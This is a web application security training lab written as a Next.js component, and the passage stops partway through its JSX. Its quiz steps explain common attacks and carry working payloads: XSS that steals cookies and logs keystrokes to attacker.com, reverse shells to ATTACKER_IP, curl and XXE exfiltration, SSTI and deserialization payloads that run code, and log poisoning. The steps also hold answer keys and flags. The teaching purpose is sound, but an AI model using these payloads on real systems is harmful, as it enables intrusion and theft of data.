'use client'
import React, { useState } from 'react'
import Link from 'next/link'
import LabTerminal, { LabStep } from '../../../components/LabTerminal'
import FreeLabTerminal from '../../../components/FreeLabTerminal'

const accent = '#00d4ff'
const moduleId = 'web-attacks'
const moduleName = 'Web Attacks'

const steps: LabStep[] = [

  // ── PHASE 1: RECON & FINGERPRINTING ──────────────────────────────────────

  {
    id: 'web-01',
    title: 'Phase 1 — Application Fingerprinting',
    objective: `Before attacking a web app you need to know its tech stack. WhatWeb is a web scanner that identifies CMS, frameworks, server software, and version numbers. Run WhatWeb in aggressive mode (aggression level 3) against a target. What flag sets aggression level 3?`,
    hint: 'WhatWeb uses -a for aggression level. Level 3 is the most aggressive.',
    answers: ['-a 3', '--aggression 3', '-a3', 'whatweb -a 3'],
    xp: 15,
    explanation: `Fingerprinting is your first step — knowing the stack tells you which CVEs to check.

whatweb -a 3 http://target.com

Aggression levels:
  -a 1  Passive (no extra requests)
  -a 3  Aggressive (follows redirects, fuzzes parameters)
  -a 4  Heavy (attempts logins and deep fuzzing)

WhatWeb identifies: Web server (Apache/nginx/IIS), CMS (WordPress/Drupal/Joomla),
programming language, JavaScript frameworks, WAF presence, and more.

After WhatWeb, also run:
  curl -I http://target.com             # Check response headers
  whatweb --list-plugins                # See all detection plugins

Headers like X-Powered-By, Server, and X-Generator leak technology info.
Remove these in production — they're free intelligence for attackers.`
  },

  {
    id: 'web-02',
    title: 'Phase 1 — Directory and File Enumeration',
    objective: `You need to discover hidden endpoints on a target. ffuf (Fuzz Faster U Fool) is the modern standard for content discovery. What flag specifies the wordlist in ffuf?`,
    hint: 'ffuf uses -w for wordlist, -u for URL with FUZZ keyword.',
    answers: ['-w', '--wordlist', '-w /path/to/wordlist'],
    xp: 15,
    explanation: `Content discovery finds hidden admin panels, backup files, and sensitive endpoints.

ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \\
     -u http://target.com/FUZZ \\
     -mc 200,301,302,403

Key flags:
  -w    Wordlist path (REQUIRED)
  -u    Target URL with FUZZ as injection point
  -mc   Match HTTP status codes (200=found, 403=forbidden but exists)
  -fc   Filter codes to hide (e.g., -fc 404)
  -t    Threads (default 40, increase for speed)
  -e    Extensions: -e .php,.html,.txt,.bak

High-value targets from content discovery:
  /admin, /administrator     — Admin panels
  /backup, /db.sql, /.git   — Sensitive data
  /api/v1, /api/v2          — API endpoints
  /.env, /config.php        — Config files

gobuster dir -u http://target.com -w wordlist.txt    # Alternative tool`
  },

  {
    id: 'web-03',
    title: 'Phase 1 — Burp Suite Proxy Setup',
    objective: `Burp Suite is the essential web testing toolkit. You've intercepted a POST login request and want to send it to Burp Repeater to manually modify and replay it. What keyboard shortcut sends a request to Repeater?`,
    hint: 'Repeater shortcut is Ctrl+R in Burp Suite.',
    answers: ['ctrl+r', 'Ctrl+R', 'ctrl r'],
    xp: 15,
    explanation: `Burp Suite is the core tool for manual web application testing.

Core workflow:
  Proxy → Intercept → Modify → Forward

Essential Burp tools:
  Proxy      — Intercept and modify traffic between browser and server
  Repeater   — Manually replay and modify individual requests (Ctrl+R)
  Intruder   — Automated fuzzing and brute force (Ctrl+I)
  Scanner    — Automated vulnerability detection (Pro only)
  Decoder    — Encode/decode Base64, URL, HTML, hex

Proxy setup:
  1. Set browser proxy to 127.0.0.1:8080
  2. Install Burp CA certificate (http://burp → CA Certificate)
  3. Enable Intercept in Proxy tab

Key shortcuts:
  Ctrl+R    Send to Repeater
  Ctrl+I    Send to Intruder
  Ctrl+F    Forward intercepted request
  Ctrl+U    URL-encode selection in Repeater

In Repeater you can:
  - Change parameters, headers, cookies
  - Test different HTTP methods (GET→POST→PUT)
  - Observe how the server responds to your modifications`
  },

  // ── PHASE 2: INJECTION ATTACKS ───────────────────────────────────────────

  {
    id: 'web-04',
    title: 'Phase 2 — SQL Injection: Error-Based Detection',
    objective: `You're testing a login form. The URL is: /login?user=admin. You inject a single quote to test for SQL injection. A database error appears. This confirms the parameter is injectable. What single character is the classic first SQLi test?`,
    hint: "A single quote breaks SQL string context and causes a syntax error.",
    answers: ["'", "single quote", "' OR 1=1--"],
    xp: 20,
    explanation: `SQL injection occurs when user input is embedded directly into SQL queries without sanitisation.

Classic detection — inject a single quote: '
The backend SQL becomes: SELECT * FROM users WHERE user=''' (syntax error → confirmed SQLi)

Types of SQL injection:
  Error-based   — Database errors leak table/column names directly
  Union-based   — Append UNION SELECT to extract data from other tables
  Blind boolean — True/false responses: AND 1=1-- (true) vs AND 1=2-- (false)
  Time-based    — Delay on true condition: AND SLEEP(5)--
  Out-of-band   — DNS/HTTP callbacks for fully blind injection

sqlmap automates detection and exploitation:
  sqlmap -u "http://target.com/login?user=admin" --dbs   # Enumerate databases
  sqlmap -u "http://target.com/login?user=admin" -D dbname --tables
  sqlmap -u "http://target.com/login?user=admin" -D dbname -T users --dump

Prevention: Parameterised queries (prepared statements). NEVER concatenate user input into SQL.`
  },

  {
    id: 'web-05',
    title: 'Phase 2 — SQL Injection: UNION-Based Extraction',
    objective: `You've confirmed SQLi on /search?q=shoes. You need to determine how many columns the original query returns before building a UNION. What technique adds NULL values to find column count?`,
    hint: "ORDER BY incrementing numbers reveals column count when an error occurs.",
    answers: ['order by', 'ORDER BY', 'order by 1--', 'ORDER BY 1--'],
    xp: 20,
    explanation: `UNION injection requires matching the column count of the original query.

Step 1 — Find column count with ORDER BY:
  shoes' ORDER BY 1--   ✓ (no error)
  shoes' ORDER BY 2--   ✓ (no error)
  shoes' ORDER BY 3--   ✓ (no error)
  shoes' ORDER BY 4--   ✗ (error → 3 columns confirmed)

Step 2 — Find displayable columns with UNION SELECT:
  shoes' UNION SELECT NULL,NULL,NULL--
  shoes' UNION SELECT 1,2,3--       # Identify which column appears on page

Step 3 — Extract data:
  shoes' UNION SELECT username,password,3 FROM users--
  shoes' UNION SELECT table_name,2,3 FROM information_schema.tables--

Extract database version and user:
  shoes' UNION SELECT @@version,@@user,database()--

Dump all usernames and hashes:
  shoes' UNION SELECT username,password,email FROM users--

Always URL-encode payloads when using browser address bar.
Burp Suite's Decoder tab (Ctrl+Shift+D) handles encoding for you.`,
    flag: 'FLAG{union_injection_mastered}'
  },

  {
    id: 'web-06',
    title: 'Phase 2 — Blind Time-Based SQL Injection',
    objective: `The search endpoint shows no output but you suspect SQLi. You test time-based blind injection. What MySQL function causes the database to wait N seconds when the condition is true?`,
    hint: 'MySQL SLEEP() function pauses execution for N seconds.',
    answers: ['sleep(5)', 'SLEEP(5)', "' AND SLEEP(5)--", 'AND SLEEP(5)'],
    xp: 20,
    explanation: `Time-based blind SQLi works when there's no visible output — you infer truth/false by response delay.

Payload structure:
  ' AND SLEEP(5)--           If delay = true condition
  ' AND IF(1=2,SLEEP(5),0)-- If no delay = false condition

Database-specific time delays:
  MySQL:      ' AND SLEEP(5)--
  PostgreSQL: '; SELECT pg_sleep(5)--
  MSSQL:      '; WAITFOR DELAY '0:0:5'--
  Oracle:     ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--

Extracting data character by character (manual):
  ' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--
  ' AND IF(SUBSTRING(password,2,1)='b',SLEEP(5),0)--

This is very slow manually — sqlmap automates it:
  sqlmap -u "http://target.com/search?q=shoes" --technique=T --level=3

Out-of-band alternative (requires DNS):
  ' AND LOAD_FILE(CONCAT('\\\\\\\\',database(),'.attacker.com\\\\a'))--`
  },

  {
    id: 'web-07',
    title: 'Phase 2 — Cross-Site Scripting (XSS): Reflected',
    objective: `A search page reflects your input back without encoding. You inject a classic XSS payload but the WAF blocks <script>. What img tag payload bypasses this and still executes JavaScript?`,
    hint: 'Use an img tag with a broken src and an onerror event handler.',
    answers: ['<img src=x onerror=alert(1)>', '<img src=x onerror=alert(1) />', '<img src="" onerror="alert(1)">'],
    xp: 20,
    explanation: `XSS executes attacker JavaScript in the victim's browser, inheriting their session context.

Three types of XSS:
  Reflected   — Payload in URL, executed immediately in response (no persistence)
  Stored      — Payload saved to database, executes for every visitor
  DOM-based   — Client-side JavaScript manipulates DOM with attacker input

Common payloads (WAF bypass techniques):
  Classic (often blocked):  <script>alert(1)</script>
  img onerror:              <img src=x onerror=alert(1)>
  SVG onload:               <svg onload=alert(1)>
  Body onpageshow:          <body onpageshow=alert(1)>
  Input autofocus:          <input autofocus onfocus=alert(1)>
  Iframe src:               <iframe src="javascript:alert(1)">

Case/encoding bypasses:
  <ScRiPt>alert(1)</ScRiPt>
  <script>alert\u0028document.cookie\u0029</script>
  %3Cscript%3Ealert(1)%3C/script%3E

Real attack payloads:
  Cookie theft:    <img src=x onerror="document.location='http://attacker.com/?c='+document.cookie">
  Keylogger:       <script>document.onkeypress=function(e){fetch('http://attacker.com/?k='+e.key)}</script>

XSS prevention: Output encoding (HTML entities), Content Security Policy (CSP), HttpOnly cookies.`,
    flag: 'FLAG{xss_filter_bypassed}'
  },

  {
    id: 'web-08',
    title: 'Phase 2 — Stored XSS: Maximum Impact',
    objective: `You've found a comment field that stores input in the database unfiltered. What makes Stored XSS more dangerous than Reflected XSS?`,
    hint: 'Think about persistence and who gets hit.',
    answers: ['persists', 'persistent', 'every visitor', 'stored in database', 'affects all users', 'no link required'],
    xp: 20,
    explanation: `Stored (Persistent) XSS is the most dangerous XSS type — your payload executes for EVERY user who views the page.

Attack scenario:
  1. Attacker posts a comment: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
  2. Server stores it in the database (no sanitisation)
  3. Every user who loads the comment page executes the payload
  4. Their session cookies are sent to attacker's server
  5. Attacker hijacks admin sessions without any phishing

High-impact stored XSS targets:
  Comment sections, forum posts, profile fields (name/bio)
  Support tickets (hits support staff with elevated privileges)
  Log viewers (hits developers/admins)
  Chat messages

BeEF (Browser Exploitation Framework) for advanced post-exploitation:
  Use XSS to hook the browser into BeEF command and control
  From BeEF you can: screenshot the browser, redirect pages, steal form inputs,
  scan internal network, perform clickjacking

Content Security Policy prevents XSS:
  Content-Security-Policy: default-src 'self'; script-src 'nonce-{random}'
  This blocks inline scripts and only allows scripts from your own origin.`
  },

  // ── PHASE 3: AUTH & SESSION ATTACKS ──────────────────────────────────────

  {
    id: 'web-09',
    title: 'Phase 3 — JWT: Algorithm Confusion Attack',
    objective: `A web app uses JWT tokens with RS256 (asymmetric). You have the server's PUBLIC key. You forge a token by switching the algorithm to HS256 and sign it with the public key as the HMAC secret. What algorithm value do you set in the JWT header?`,
    hint: 'You are switching from asymmetric RS256 to symmetric HS256.',
    answers: ['HS256', 'hmac256', 'HMAC-SHA256'],
    xp: 25,
    explanation: `JWT Algorithm Confusion (CVE-2022-21449 family) — one of the most powerful JWT attacks.

How it works:
  RS256 uses: private key to sign, public key to verify
  HS256 uses: same secret key for both signing and verifying

  If the server doesn't enforce the algorithm, you can:
  1. Grab the server's PUBLIC key (often at /.well-known/jwks.json or /api/keys)
  2. Change alg from RS256 to HS256 in the JWT header
  3. Sign the forged token using the PUBLIC key as the HMAC secret
  4. The server verifies using the same public key — it passes!

Tools:
  jwt_tool:  python3 jwt_tool.py TOKEN -X k -pk public.pem   # Confusion attack
  jwt.io:    Online JWT decoder/encoder

Other JWT attacks:
  "none" algorithm:  Change alg to "none", remove signature → server skips verification
    Header: {"alg":"none","typ":"JWT"}

  Weak secrets:  Sign with HS256 but use a guessable secret
    hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt

  Key injection (kid parameter):
    {"kid":"../../dev/null"} → HMAC with empty string as secret

Always check: Is the alg header value enforced? Is the secret weak? Is kid sanitised?`,
    flag: 'FLAG{jwt_confusion_attack}'
  },

  {
    id: 'web-10',
    title: 'Phase 3 — IDOR: Horizontal Privilege Escalation',
    objective: `A REST API endpoint /api/users/1042/orders returns your orders. You change the ID to 1041. You get another user's orders — no error, no authorisation check. What vulnerability class is this?`,
    hint: 'Direct object references without authorisation checks.',
    answers: ['idor', 'IDOR', 'insecure direct object reference', 'broken object level authorization', 'bola', 'BOLA'],
    xp: 20,
    explanation: `IDOR (Insecure Direct Object Reference) / BOLA (Broken Object Level Authorization) — OWASP API Security #1.

The vulnerability: The server trusts the client to provide their own ID without verifying ownership.

Attack patterns:
  Sequential IDs:  /api/orders/1042 → try 1041, 1040, 1039...
  GUIDs:           /api/users/a1b2c3d4-... → enumerate via other endpoints
  Filenames:       /download?file=report_john.pdf → /download?file=report_admin.pdf
  Encoded IDs:     Decode Base64 IDs: dXNlcl8xMDQy → user_1042 → change → re-encode

Finding IDOR:
  1. Capture any API request with Burp that references your own resource
  2. Note the identifier type (integer, UUID, filename)
  3. Modify the identifier to reference another user's resource
  4. 200 response with data = IDOR confirmed

Vertical privilege escalation version:
  /api/admin/users → regular user accessing admin endpoint
  /api/users/1042?role=admin → parameter manipulation

Prevention: Always verify the authenticated user OWNS the requested resource.
  if (order.userId !== request.user.id) return 403;`
  },

  // ── PHASE 4: SERVER-SIDE ATTACKS ─────────────────────────────────────────

  {
    id: 'web-11',
    title: 'Phase 4 — Local File Inclusion (LFI)',
    objective: `A PHP page loads templates via /page?template=home. You test for LFI. What directory traversal payload reads /etc/passwd?`,
    hint: 'Use ../ to traverse up from web root. You need many levels to reach /.',
    answers: ['../../../../etc/passwd', '../../../etc/passwd', '../../etc/passwd', '....//....//etc/passwd'],
    xp: 20,
    explanation: `LFI occurs when PHP include() or require() uses unsanitised user input to load files.

Vulnerable PHP code:
  <?php include($_GET['template'] . '.php'); ?>

Basic traversal:
  ?template=../../../../etc/passwd

If .php is appended you can bypass with null byte (PHP < 5.4):
  ?template=../../../../etc/passwd%00

Path normalisation bypass (replaces ../ after filtering):
  ....//....//....//etc/passwd   → becomes ../../etc/passwd

URL encoding bypass:
  ..%2F..%2F..%2Fetc%2Fpasswd

High-value files to read:
  /etc/passwd                              User accounts
  /etc/shadow                              Password hashes (need root)
  /proc/self/environ                       Environment variables (may contain secrets)
  /var/www/html/config.php                 DB credentials
  /home/user/.ssh/id_rsa                   Private SSH keys
  /var/log/apache2/access.log              Log file (for log poisoning)

LFI to RCE via log poisoning:
  1. Inject PHP into User-Agent: <?php system($_GET['cmd']); ?>
  2. Include the Apache log: ?template=../../../../var/log/apache2/access.log&cmd=id
  3. Your PHP executes in the log context`,
    flag: 'FLAG{lfi_traversal_complete}'
  },

  {
    id: 'web-12',
    title: 'Phase 4 — Server-Side Request Forgery (SSRF)',
    objective: `A web app fetches URLs server-side: /fetch?url=http://example.com. The server is hosted on AWS EC2. What URL would you use to read the AWS instance metadata and potentially get IAM credentials?`,
    hint: 'AWS metadata service is always at the link-local IP 169.254.169.254.',
    answers: ['http://169.254.169.254', 'http://169.254.169.254/latest/meta-data/', '169.254.169.254'],
    xp: 25,
    explanation: `SSRF makes the server send requests on your behalf — accessing internal services invisible to you.

AWS EC2 metadata attack:
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
  → Returns: AccessKeyId, SecretAccessKey, Token (temporary creds!)

Other cloud metadata endpoints:
  GCP:   http://metadata.google.internal/computeMetadata/v1/
  Azure: http://169.254.169.254/metadata/instance?api-version=2019-11-01

SSRF to internal network scanning:
  http://127.0.0.1:6379          Redis (often no auth)
  http://127.0.0.1:9200          Elasticsearch
  http://127.0.0.1:8080          Internal admin panel
  http://10.0.0.1:22             SSH
  http://192.168.1.1             Router admin

SSRF filter bypass techniques:
  http://[::1]:80                IPv6 localhost
  http://0x7f000001             Hex encoded 127.0.0.1
  http://2130706433            Decimal encoded 127.0.0.1
  http://localhost.attacker.com  DNS rebinding
  http://127.0.0.1.nip.io       Wildcard DNS bypass

AWS IMDSv2 (newer protection) requires a token:
  curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`,
    flag: 'FLAG{ssrf_cloud_metadata}'
  },

  {
    id: 'web-13',
    title: 'Phase 4 — Server-Side Template Injection (SSTI)',
    objective: `A web app greets you with: "Hello {username}". You enter {{7*7}} as your username. The page shows "Hello 49". This confirms SSTI. The template engine is Jinja2. What payload achieves Remote Code Execution by running the "id" command?`,
    hint: 'Jinja2 RCE uses Python class traversal to reach os.popen().',
    answers: [
      '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',
      '{{"".__class__.__mro__[1].__subclasses__()[396]("id",shell=True,stdout=-1).communicate()[0].strip()}}',
      '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}'
    ],
    xp: 25,
    explanation: `SSTI occurs when user input is embedded directly into a template engine — enabling code execution.

Detection matrix (inject → expected output):
  {{7*7}}          → 49    (Jinja2/Twig/Freemarker)
  DOLLAR{7*7}     → 49    (Mako/ERB/Smarty — uses dollar-brace syntax)
  #{7*7}           → 49    (Ruby ERB)
  {{7*'7'}}        → 49    (Jinja2) | 7777777 (Twig)

Jinja2 RCE payload breakdown:
  config.__class__           → class 'flask.config.Config'
  .__init__                  → the __init__ method
  .__globals__               → global namespace (has 'os' module)
  ["os"].popen("id").read()  → run shell command

Simpler Jinja2 RCE (Flask debug mode):
  {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

Twig RCE:
  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

Freemarker RCE:
  <#assign ex="freemarker.template.utility.Execute"?new()>EXECUTE_RESULT("id")

Prevention: Never pass user input to template.render(). Use sandboxed environments.`,
    flag: 'FLAG{ssti_rce_achieved}'
  },

  {
    id: 'web-14',
    title: 'Phase 4 — XML External Entity Injection (XXE)',
    objective: `An API endpoint accepts XML. You want to read /etc/passwd via XXE. What DOCTYPE declaration defines an external entity named "xxe" pointing to /etc/passwd?`,
    hint: 'XXE uses DOCTYPE with ENTITY declaration using SYSTEM and file:// URI.',
    answers: [
      '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
      '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
      '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
    ],
    xp: 25,
    explanation: `XXE exploits XML parsers that process external entity references — reading local files or making server-side requests.

Basic XXE payload:
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <root><data>&xxe;</data></root>

The &xxe; reference gets replaced with the file contents in the XML response.

SSRF via XXE:
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

Blind XXE (out-of-band — when no output in response):
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;%exfil;

XXE via file upload (SVG, DOCX, XLSX):
  SVG files support XML — upload a malicious SVG:
  <?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <svg><text>&xxe;</text></svg>

Prevention: Disable external entity processing in your XML parser:
  Java:      factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
  PHP:       libxml_disable_entity_loader(true)
  Python:    Use defusedxml library instead of standard xml`,
    flag: 'FLAG{xxe_file_read}'
  },

  {
    id: 'web-15',
    title: 'Phase 4 — Command Injection',
    objective: `A web app runs: ping -c 1 {user_input}. You control user_input. What operator appends a second command to run after ping completes, regardless of ping's exit code?`,
    hint: 'The semicolon runs two commands sequentially regardless of the first result.',
    answers: [';', 'semicolon', '; id', '127.0.0.1; id'],
    xp: 20,
    explanation: `Command injection occurs when user input is passed to OS shell functions without sanitisation.

Linux command chaining operators:
  ;           Run regardless of previous exit code: ping 8.8.8.8; id
  &&          Run only if previous succeeded:       ping 8.8.8.8 && cat /etc/passwd
  ||          Run only if previous FAILED:          ping bad_host || whoami
  |           Pipe output to next command:          ls | grep config

Blind command injection (no output):
  Use time delays:    127.0.0.1; sleep 5
  Use DNS callback:   127.0.0.1; nslookup $(whoami).attacker.com
  Use HTTP callback:  127.0.0.1; curl http://attacker.com/$(id | base64)

Get a reverse shell:
  127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
  127.0.0.1; python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

Filter bypasses:
  Space filter:   {cat,/etc/passwd}     Use brace expansion
  Slash filter:   cat$IFS/etc/passwd    Use $IFS (Internal Field Separator — no braces needed)
  Quote bypass:   c'a't /etc/passwd     Insert quotes in command name

Prevention: NEVER pass user input to exec/system/shell_exec. Use parameterised system calls.`
  },

  // ── PHASE 5: ADVANCED TECHNIQUES ─────────────────────────────────────────

  {
    id: 'web-16',
    title: 'Phase 5 — HTTP Request Smuggling',
    objective: `HTTP Request Smuggling exploits disagreements between front-end proxy and back-end server on request boundary parsing. The two primary smuggling techniques are CL.TE and TE.CL. What do CL and TE stand for in this context?`,
    hint: 'These are standard HTTP headers: one for length, one for chunked transfer.',
    answers: ['content-length transfer-encoding', 'content-length and transfer-encoding', 'CL=Content-Length TE=Transfer-Encoding', 'content length, transfer encoding'],
    xp: 25,
    explanation: `HTTP Request Smuggling is an advanced technique that can bypass security controls, poison caches, and hijack other users' requests.

How it works:
  Front-end proxy and back-end server disagree on where one HTTP request ends.
  The "leftover" bytes from request A become the beginning of request B.

CL.TE attack (front-end uses Content-Length, back-end uses Transfer-Encoding):
  POST / HTTP/1.1
  Content-Length: 13
  Transfer-Encoding: chunked

  0

  SMUGGLED

  The backend sees the 0-length chunk as end of request, but the "SMUGGLED" bytes
  prefix the NEXT user's request.

Impact:
  - Bypass access controls (prepend admin path to next user's request)
  - Steal other users' request bodies (capture victim's password resets)
  - Cache poisoning (poison shared reverse proxy cache with your response)
  - Reflected XSS in request headers

Detection with Burp Suite:
  Extension: HTTP Request Smuggler (James Kettle)
  Send to Repeater, enable "Update Content-Length: OFF"

Turbo Intruder (Burp extension) for timing-based detection:
  Simultaneous requests with carefully crafted lengths reveal smuggling.`
  },

  {
    id: 'web-17',
    title: 'Phase 5 — Insecure Deserialization',
    objective: `A Java web app stores session data as a serialized object in a cookie. You identify the base64 starts with "rO0AB" — the Java serialization magic bytes. What tool generates malicious Java deserialization payloads?`,
    hint: 'ysoserial is the classic Java deserialization exploit framework.',
    answers: ['ysoserial', 'ysoserial.jar'],
    xp: 25,
    explanation: `Insecure deserialization occurs when untrusted data is deserialized, allowing attackers to craft objects that execute code during reconstruction.

Java magic bytes:
  Hex:    AC ED 00 05
  Base64: rO0AB...     ← Always starts with this

ysoserial — generates payloads for Java deserialization gadget chains:
  java -jar ysoserial.jar CommonsCollections1 "calc.exe" | base64
  java -jar ysoserial.jar CommonsCollections6 "curl http://attacker.com/$(id|base64)" | base64

Popular gadget chains (depends on libraries present):
  CommonsCollections1-7    Apache Commons Collections
  Spring1/Spring2          Spring Framework
  Groovy1                  Apache Groovy

PHP deserialization:
  PHP objects are serialized as: O:4:"User":2:{s:4:"name";s:5:"admin";}
  If a class has __wakeup() or __destruct() methods, these run on deserialization
  Attack: serialize a crafted object triggering dangerous code in those methods

Python pickle deserialization:
  import pickle, os
  class Exploit(object):
    def __reduce__(self):
      return (os.system, ('id',))
  payload = pickle.dumps(Exploit())

Prevention: Never deserialize untrusted data. Use HMAC to sign serialized cookies.`,
    flag: 'FLAG{deserialization_rce}'
  },

  {
    id: 'web-18',
    title: 'Phase 5 — OAuth 2.0 Vulnerabilities',
    objective: `An OAuth implementation uses a "state" parameter for CSRF protection. You observe the state parameter is not validated on the callback. What attack does this enable?`,
    hint: 'Without state validation, an attacker can force you to link their account to your session.',
    answers: ['csrf', 'account takeover', 'oauth csrf', 'cross-site request forgery', 'forced account linking'],
    xp: 25,
    explanation: `OAuth misconfigurations are extremely common and lead to account takeovers on major platforms.

CSRF via missing state validation:
  1. Attacker initiates OAuth with their own social account
  2. Gets the OAuth callback URL: /callback?code=ATTACKER_CODE&state=...
  3. Tricks victim into visiting that callback URL
  4. Victim's session links to attacker's social account
  5. Attacker can now log in as victim

Other OAuth vulnerabilities:

Redirect URI manipulation:
  App registers: https://app.com/callback
  Attack: ?redirect_uri=https://attacker.com/callback
  If wildcard allowed or partial match: ?redirect_uri=https://app.com.attacker.com

Authorization code leakage via Referer:
  The code appears in the URL → leaks in Referer header to third-party scripts

Open redirect chaining:
  If redirect_uri must match domain but there's an open redirect:
  ?redirect_uri=https://app.com/redirect?url=https://attacker.com

Token in fragment (#) bypass:
  Implicit flow sends token in URL fragment — visible to JS on the page

Testing OAuth with Burp:
  1. Walk through OAuth flow with intercept on
  2. Check: Is state parameter random and validated?
  3. Check: Is redirect_uri strictly validated?
  4. Try modifying redirect_uri to your server
  5. Check: Is the authorization code reusable?`
  },

  {
    id: 'web-19',
    title: 'Phase 5 — GraphQL Injection and Introspection',
    objective: `A web app uses GraphQL. You send an introspection query to map all available queries, mutations, and types. What field do you query to get all available types in the schema?`,
    hint: 'GraphQL introspection uses __schema and __type system fields.',
    answers: ['__schema', '{__schema{types{name}}}', '__schema{types{name kind}}'],
    xp: 25,
    explanation: `GraphQL APIs have unique attack surface — introspection, injection, and authorization bypass.

Full introspection query (maps entire API):
  {
    __schema {
      types { name kind fields { name type { name } } }
      queryType { fields { name } }
      mutationType { fields { name args { name } } }
    }
  }

Paste into Burp Repeater or GraphQL Playground for full schema dump.

GraphQL injection attacks:
  Field enumeration (guess hidden fields):
    { user(id: 1) { id username password email ssn } }
    → Server returns error only for fields that don't exist

  Batch query attacks (rate limit bypass):
    [ {"query":"mutation{login(user:\"admin\",pass:\"pass1\")}"}, ... x1000 ]
    → Send 1000 login attempts in ONE HTTP request

  Mutation SQL injection:
    mutation { updateUser(id: 1, name: "' OR 1=1--") { id } }

  IDOR in GraphQL:
    { user(id: 1042) { privateMessages { content } } }   → change ID

  Introspection disabled? Try:
    { __type(name: "User") { fields { name } } }
    Batch introspection via aliases:
      { a: __schema { types { name } } }

Tools:
  graphql-voyager    Visual schema explorer
  clairvoyance       Recover schema when introspection disabled
  InQL (Burp plugin) GraphQL security testing suite`,
    flag: 'FLAG{graphql_schema_dumped}'
  },

  {
    id: 'web-20',
    title: 'Phase 5 — WAF Bypass Techniques',
    objective: `A WAF is blocking UNION SELECT in your SQL injection. What technique breaks up the keyword using SQL comment syntax to evade pattern matching?`,
    hint: 'SQL inline comments /**/ can be inserted anywhere in keywords.',
    answers: ['UN/**/ION', 'UNION/**/SELECT', '/*!UNION*/ SELECT', 'UNI/**/ON SEL/**/ECT'],
    xp: 20,
    explanation: `WAF bypass is a cat-and-mouse game. Understanding evasion helps you test WAF rules and understand defense gaps.

SQL injection WAF bypasses:

Comment injection:
  UN/**/ION SE/**/LECT         Standard SQL comments
  UN/*!*/ION SE/*!*/LECT       MySQL version comments (executes in all versions)
  /*!50000UNION*/SELECT        Executes if MySQL version >= 5.0.0

Case variation:
  uNiOn SeLeCt                 SQL is case-insensitive
  uNiOn%0aSelEcT              URL-encoded newlines between keywords

Encoding bypasses:
  %55NION → UNION              URL encoding the U
  &#85;NION → UNION            HTML entity encoding

Double encoding:
  %2527 → %27 → '             Double URL-encoded single quote

XSS WAF bypasses:
  HTML encoding:    &lt;script&gt;
  Uppercase:        <SCRIPT>alert(1)</SCRIPT>
  Null bytes:       <scr%00ipt>alert(1)</scr%00ipt>
  Unicode:          <script>alert(\u0031)</script>

Path traversal WAF bypasses:
  ....//....//etc/passwd       Double slashes with extra dots
  ..%252fetc%252fpasswd        Double URL-encoded slash
  /etc/passwd%00               Null byte termination

WAF fingerprinting:
  Send intentional attack strings and observe:
  - 403 → WAF blocking
  - 400 → Input validation
  - Response headers: X-Sucuri, X-Firewall, CF-RAY (Cloudflare)`
  },

  // ── PHASE 6: OPEN-ENDED PRACTICE ─────────────────────────────────────────

  {
    id: 'web-21',
    title: 'Phase 6 — Full Application Pentest Methodology',
    objective: `You're starting a web application penetration test. What is the correct first phase before any active testing — the phase where you passively gather information without touching the target?`,
    hint: 'This phase involves only passive information collection: WHOIS, shodan, Google dorks.',
    answers: ['recon', 'reconnaissance', 'passive recon', 'passive reconnaissance', 'osint'],
    xp: 20,
    explanation: `A systematic web application pentest follows these phases:

PHASE 1 — PASSIVE RECONNAISSANCE (no direct target interaction)
  WHOIS:          whois target.com
  DNS:            dig target.com ANY; dnsrecon -d target.com
  Google dorks:   site:target.com filetype:pdf; site:target.com inurl:admin
  Shodan:         Search for target IP or org name
  waybackmachine: Historical site versions with old endpoints
  GitHub:         Search for leaked credentials, API keys, source code
  Certificates:   crt.sh for subdomain discovery

PHASE 2 — ACTIVE RECON (touching the target)
  Port scanning:  nmap -sV -sC target.com
  Subdomains:     subfinder -d target.com | httpx
  Directory enum: ffuf -w wordlist -u http://target.com/FUZZ
  Tech stack:     whatweb -a 3; wappalyzer browser extension
  Spider:         Burp Suite spider or gospider

PHASE 3 — VULNERABILITY IDENTIFICATION
  Manual testing through Burp Suite proxy
  Automated scanning: nikto -h target.com
  OWASP ZAP active scan

PHASE 4 — EXPLOITATION
  Exploit identified vulnerabilities with proof-of-concept
  Document impact: what data/systems were accessible?

PHASE 5 — REPORTING
  Executive summary, technical findings, reproduction steps, remediation`
  },

]

export default function WebAttacksLab() {
  const [guidedDone, setGuidedDone] = useState(false)
  const [earnedXp, setEarnedXp] = useState(0)

  const xpTotal = steps.reduce((sum, s) => sum + s.xp, 0)

  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#004a5a' }}>
